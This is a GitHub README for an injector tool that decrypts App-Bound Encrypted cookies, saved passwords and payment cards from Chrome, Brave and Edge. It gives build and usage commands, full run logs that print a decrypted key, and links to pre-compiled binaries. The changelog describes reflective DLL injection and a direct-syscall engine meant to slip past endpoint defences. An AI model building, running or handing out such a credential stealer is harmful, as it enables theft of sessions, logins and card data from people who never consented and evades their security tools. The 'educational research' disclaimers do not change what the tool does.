# Chrome App-Bound Encryption Decryption

## 🚀 Overview

Fully decrypt **App-Bound Encrypted (ABE)** cookies, passwords & payment methods from Chromium-based browsers (Chrome, Brave, Edge) — all in user mode, no admin rights required.

If you find this useful, I’d appreciate a coffee:  
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)

## 🛡️ Background

Starting in **Chrome 127+**, Google began rolling out **App-Bound Encryption** to secure local user data:

1. **Key generation**: a per-profile AES-256-GCM key is created and wrapped by Windows DPAPI.
2. **Storage**: that wrapped key (Base64-encoded, prefixed with `APPB`) lands in your **Local State** file.
3. **Unwrapping**: Chrome calls the **IElevator** COM server, but **only** if the caller’s EXE lives in the browser’s install directory.

These path-validation checks prevent any external tool — even with direct DPAPI access — from unwrapping the ABE key.

## 💡 Project Philosophy & Disclaimer

> [!IMPORTANT]
> This is a hobby project created for educational and security research purposes. It serves as a personal learning experience and a playing field for exploring advanced Windows concepts.
>
> **This tool is NOT intended to be a fully-featured infostealer or a guaranteed EDR evasion tool.** While it employs advanced techniques, its primary goal is to demonstrate and dissect the ABE mechanism, not to provide operational stealth for malicious use. Please ensure compliance with all relevant legal and ethical guidelines.

## 🛠️ How It Works

**This project** injects a DLL into the running browser process using **Reflective DLL Injection (RDI)**. The RDI technique for x64 is based on [Stephen Fewer's original work](https://github.com/stephenfewer/ReflectiveDLLInjection), and for ARM64, it utilizes my method detailed in [ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection). Once injected, the DLL:

1.  **Stealthy Injector (`chrome_inject.exe`):** Employs an advanced, multi-architecture **direct syscall** engine to execute a fileless, in-memory injection of the payload. This method avoids high-level WinAPI calls, minimizing its signature for EDR products.
2.  **Reflective Payload (`chrome_decrypt.dll`):** Once in the target's address space, it uses **Reflective DLL Injection (RDI)** to properly load itself into memory. It then invokes the `IElevator` COM interface to unwrap the ABE key and decrypt all sensitive data in user land, no elevation needed.

## 🔬 In-Depth Technical Analysis & Research

For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:

1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**

    This document covers:
    * The evolution from DPAPI to ABE.
    * A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
    * Detailed methodology of the DLL injection strategy used by this tool.
    * Analysis of encrypted data structures and relevant Chromium source code insights.
    * Discussion of alternative decryption vectors and Chrome's evolving defenses.

2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**

    This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
    *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
    *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
    *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
    *   A practical look at debugging tricky COM interoperability issues.

3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**

    This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
    *   Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
    *   Details COMrade ABE's methodology: registry scanning for service discovery, Type Library loading and parsing, and heuristic-based ABE method signature matching.
    *   Provides a comprehensive guide to interpreting COMrade ABE's output, including CLSIDs, IIDs (standard and C++ style), and the significance of verbose output details like VTable offsets, defining interfaces, and full inheritance chains.
    *   Highlights the utility of the auto-generated C++ stubs (`--output-cpp-stub`) for rapid development and research.
    *   Discusses how COMrade ABE aids in adapting to ABE changes, analyzing new Chromium browsers, and understanding vendor-specific COM customizations.

### ⚙️ Key Features

- 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods
- 📁 Customizable output directory for extracted data (`.\output\` by default)
- 👥 Support for multiple browser profiles (Default, Profile 1, Profile 2, etc.)
- 🛡️ Advanced direct syscall injection engine to bypass common endpoint defenses
- 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
- 🛠️ No admin privileges required

![image](https://github.com/user-attachments/assets/0966c6cc-2392-4e64-b2ec-28a66731f098)


## 📦 Supported & Tested Versions

| Browser            | Tested Version (x64 & ARM64) |
| ------------------ | ---------------------------- |
| **Google Chrome**  | 137.0.7151.104               |
| **Brave**          | 1.79.123 (137.0.7151.104)    |
| **Microsoft Edge** | 138.0.3351.21                |

> [!NOTE]  
> The injector requires the target browser to be **running** unless you use `--start-browser`.

## 🔧 Build Instructions

1. **Clone** the repository and open a _Developer Command Prompt for VS_ (or any MSVC‑enabled shell).

2. **Prepare SQLite Amalgamation**

   1. The [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) source files (`sqlite3.c`, `sqlite3.h`) are included in the `libs/sqlite/` directory.

   2. In a **Developer Command Prompt for VS** (ensure you're in the project root):

   ```bash
   cl /nologo /W3 /O2 /MT /c libs\sqlite\sqlite3.c /Folibs\sqlite\sqlite3.obj
   lib /nologo /OUT:libs\sqlite\sqlite3.lib libs\sqlite\sqlite3.obj
   ```

   This produces `libs\sqlite\sqlite3.lib` which will be linked into the DLL.

3. **Compile the DLL** (responsible for the decryption logic):

   ```bash
   cl /EHsc /std:c++17 /LD /O2 /MT /Ilibs\sqlite src\chrome_decrypt.cpp src\reflective_loader.c libs\sqlite\sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
   ```

4. **Compile the injector** (responsible for DLL injection & console UX):

   ```bash
   cl /EHsc /O2 /std:c++17 /MT src\chrome_inject.cpp src\syscalls.cpp version.lib shell32.lib /link /OUT:chrome_inject.exe
   ```

Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.

###  Automated Builds with GitHub Actions

This project uses GitHub Actions to automatically build `chrome_inject.exe` and `chrome_decrypt.dll` for both **x64** and **ARM64** architectures.

You can find the latest pre-compiled binaries attached to the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases) of this repository.

## 🚀 Usage

```bash
PS> .\chrome_inject.exe [options] <chrome|brave|edge>
```

### Options

Options

- `--start-browser` or `-s`
  Auto-launch the browser if it’s not already running.

- `--output-path <path>` or `-o <path>`
  Specifies the base directory for output files.
  Defaults to `.\output\` relative to the injector's location.
  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.

- `--verbose` or `-v`
  Enable extensive debugging output from the injector.

- `--help` or `-h`
  Show this help message.

### Examples

```bash
# Standard injection into a running Chrome process:
PS> .\chrome_inject.exe chrome

# Auto-start Brave and show verbose debug logs:
PS> .\chrome_inject.exe --start-browser --verbose brave
```

#### Normal Run

```bash
PS> .\chrome_inject.exe --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.11.0 by @xaitax                          |
------------------------------------------------

[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_9c71c588-e69d-4b59-ba30-1d6303c2eaba

[+] COM library initialized (APARTMENTTHREADED).
[+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for Chrome.
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] Found profile: Default
[*] Found profile: Profile 1
[*] Processing profile: Default at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Default
     [*] 9 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
     [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
     [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
[*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
     [*] 136 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
[*] Chrome data decryption process finished for Chrome.
[+] DLL signaled completion or pipe interaction ended.
```

#### Verbose

```bash
PS> .\chrome_inject.exe --verbose --start-browser chrome
------------------------------------------------
|  Chrome App-Bound Encryption Decryption      |
|  Direct Syscall Injection Engine             |
|  x64 & ARM64 | Cookies, Passwords, Payments  |
|  v0.11.0 by @xaitax                          |
------------------------------------------------

[#] [Syscalls] Found and sorted 489 Zw* functions.
[#] [Syscalls] Successfully initialized all syscall stubs via Tartarus Gate.
[#] [Syscalls]   - NtAllocateVirtualMemory found at 140734625681808
[#] Verbose mode enabled.
[#] Auto-start browser enabled.
[#] Browser type argument: chrome
[#] CleanupPreviousRun: attempting to remove temp files
[#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[#] Resolved output path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
[#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
[#] GetProcessIdByName: snapshotting processes for chrome.exe
[#] HandleGuard: acquired handle 0xdc (CreateToolhelp32Snapshot)
[#] Found process chrome.exe PID=8720
[#] HandleGuard: closing handle 0xdc (CreateToolhelp32Snapshot)
[#] Opening process PID=8720
[#] HandleGuard: acquired handle 0xdc (TargetProcessHandle)
[#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
[#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
[#] Architecture match: Injector=ARM64, Target=ARM64
[#] Memory for pipe name allocated in target at 0x1d7825f0000
[#] Pipe name written to target memory.
[#] GetPayloadDllPathUtf8: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
[#] InjectWithReflectiveLoader: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll, Param: 0x1d7825f0000
[#] RDI: DLL read into local buffer. Size: 1400320 bytes.
[#] RDI: ReflectiveLoader file offset: 0x18b90
[#] RDI: Memory allocated in target at 0x1d782e50000 (Size: 1400320 bytes)
[#] RDI: DLL written to target memory.
[#] RDI: Calculated remote ReflectiveLoader address: 0x1d782e68b90
[#] HandleGuard: reset to handle 0xe0
[#] RDI: Waiting for remote ReflectiveLoader thread to complete (max 15s)...
[#] RDI: Remote thread exit code: 0x82fb0000
[#] RDI: Remote ReflectiveLoader thread finished.
[#] InjectWithReflectiveLoader: done
[#] HandleGuard: closing handle 0xe0 (RemoteReflectiveLoaderThread_Syscall)
[+] DLL injected via Reflective DLL Injection (RDI with Syscalls)
[#] Waiting for DLL to connect to named pipe: \\.\pipe\ChromeDecryptIPC_6f6a66c2-6712-49ad-9c98-d3701e8f2d61
[#] DLL connected to named pipe.
[#] Verbose status (VERBOSE_TRUE) sent to DLL.
[#] Output path sent to DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
[*] Waiting for DLL (Pipe: \\.\pipe\ChromeDecryptIPC_6f6a66c2-6712-49ad-9c98-d3701e8f2d61

[+] Terminated process: ID 19772 (chrome.exe)
[+] Terminated process: ID 4048 (chrome.exe)
[+] Terminated process: ID 12188 (chrome.exe)
[+] COM library initialized (APARTMENTTHREADED).
[+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
[+] Encrypted key header is valid.
[+] Encrypted key blob from Local State (1220 bytes).
[+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
[+] IElevator instance created for Chrome.
[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for Chrome.
[+] IElevator -> DecryptData successful. Decrypted key length: 32
[+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
[+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
[*] Found profile: Default
[*] Found profile: Profile 1
[*] Processing profile: Default at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Default
     [*] 9 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
     [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
     [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
[*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
     [*] 136 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
[*] Chrome data decryption process finished for Chrome.
[#] DLL completion signal received via pipe.
[+] DLL signaled completion or pipe interaction ended.
[#] Freed pipe name memory in target process.
[#] Browser was already running; injector will not terminate it.
[#] Injector finished.
[#] HandleGuard: closing handle 0xdc (TargetProcessHandle)
[#] HandleGuard: closing handle 0xd4 (NamedPipeServer)
```

## 📂 Data Extraction

Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:

**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.txt

Example paths (assuming default output location):**

- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.txt
- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.txt
- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.txt

### 🍪 Cookie Extraction

Each cookie file is a JSON array of objects:

```json
[
  {
    "host": "accounts.google.com",
    "name": "ACCOUNT_CHOOSER",
    "value": "AFx_qI781-…"
  },
  {
    "host": "mail.google.com",
    "name": "OSID",
    "value": "g.a000uwj5ufIS…"
  },
  …
]
```

### 🔑 Password Extraction

Each password file is a JSON array of objects:

```json
[
  {
    "origin": "https://example.com/login",
    "username": "user@example.com",
    "password": "••••••••••"
  },
  {
    "origin": "https://another.example.com",
    "username": "another_user",
    "password": "••••••••••"
  }
  …
]
```

### 💳 Payment Method Extraction

Each payment file is a JSON array of objects:

```json
[
  {
    "name_on_card": "John Doe",
    "expiration_month": 12,
    "expiration_year": 2030,
    "card_number": "••••••••••1234",
    "cvc": "•••"
  },
  {
    "name_on_card": "Jane Smith",
    "expiration_month": 07,
    "expiration_year": 2028,
    "card_number": "••••••••••5678",
    "cvc": "•••"
  }
  …
]
```

## 🆕 Changelog

### v0.11
- **Kernel-Level Execution Syscall Engine (Halo's & Tartarus Gate Fusion)**: Implemented a multi-architecture syscall resolution system for improved stealth. This hybrid engine combines the strengths of multiple modern techniques:
  - The injector first attempts a [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) approach by dynamically calculating the required System Service Numbers (SSNs) and hunting for clean, unhooked syscall stubs within ntdll.dll.
  - In heavily monitored environments where no clean stubs can be found (as discovered on Windows on ARM64 installations), the system automatically pivots to a [Tartarus Gate](https://github.com/trickster0/TartarusGate) methodology. It directly leverages the function pointers of the (potentially hooked) Zw functions, ensuring execution continuity by passing through the EDR's hooks to the kernel.
  - This dual-pronged strategy provides maximum stealth and operational resilience across diverse target environments on both x64 and ARM64.
- **Stealth Enhancement (IPC)**: Transitioned from file-based IPC to **Named Pipes** for configuration and logging. `chrome_inject.exe` (server) passes a unique pipe name to the target's remote memory. `chrome_decrypt.dll` (client) uses this pipe for receiving output path configuration and for streaming log data/completion signals directly to the injector, minimizing on-disk artifacts and eliminating global named event usage.

### v0.10
- **Refactor**: Switched to **Reflective DLL Injection (RDI)** as the sole injection method, removing older `LoadLibrary` and `NtCreateThreadEx` options for enhanced stealth. (x64 RDI based on [Stephen Fewer's work](https://github.com/stephenfewer/ReflectiveDLLInjection), ARM64 RDI based on [xaitax/ARM64-ReflectiveDLLInjection](https://github.com/xaitax/ARM64-ReflectiveDLLInjection)).

### v0.9
- **New**: Added `--output-path` (`-o`) argument to `chrome_inject.exe` for user-configurable output directory. Output files are now organized by BrowserName/ProfileName/data_type.txt.
- **New**: Implemented support for automatically detecting and decrypting data from multiple browser profiles (e.g., Default, Profile 1, Profile 2).
- **CI/CD**: Integrated GitHub Actions workflow for automated building of x64 and ARM64 binaries, and automatic release creation upon new version tags.
- **Project Structure**: Reorganized the repository into src/, libs/, docs/, and tools/ directories for better maintainability.

### v0.8

- **New**: **Reliable Microsoft Edge Decryption:** Implemented support for Edge's native App-Bound Encryption COM interface (`IElevatorEdge`), resolving previous inconsistencies and removing dependency on Brave Browser being installed. This involved detailed COM interface analysis and tailored C++ stubs for Edge's specific vtable layout.

### v0.7

- **New**: Implemented Kernel Named Events for flawless timing between Injector and DLL operations.
- **Improved**: Major refactoring of both Injector and DLL for enhanced stability, performance, and maintainability.
- **Improved**: Strict RAII implemented for all system resources (Handles, COM, SQLite) to prevent leaks.
- **Improved**: More accurate and immediate error code capture and reporting.
- **Improved**: Adaptive Locking Bypass / Enhanced Locked File Access (SQLite nolock=1 for Login Data/Payment Methods)
- **Improved**: Dynamic Path Resolution / Dynamic Path Discovery (modern Windows APIs)
- **Improved**: Optimized DLL's browser termination logic.

### v0.6

- **New**: Full Username & Password extraction
- **New**: Full Payment Information (e.g., Credit Card) extraction

### v0.5

- **New**: Full Cookie extraction into JSON format

### v0.4

- **New**: selectable injection methods (`--method load|nt`)
- **New**: auto‑start the browser if not running (`--start-browser`)
- **New**: verbose debug output (`--verbose`)
- **New**: automatically terminate the browser after decryption
- **Improved**: Injector code refactoring

Further Links:

- [Google Security Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [Chrome app-bound encryption Service](https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view)
- [snovvcrash](https://x.com/snovvcrash)
- [SilentDev33](https://github.com/SilentDev33/ChromeAppBound-key-injection)

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

> [!WARNING]  
> This tool is intended for cybersecurity research and educational purposes. Ensure compliance with all relevant legal and ethical guidelines when using this tool.
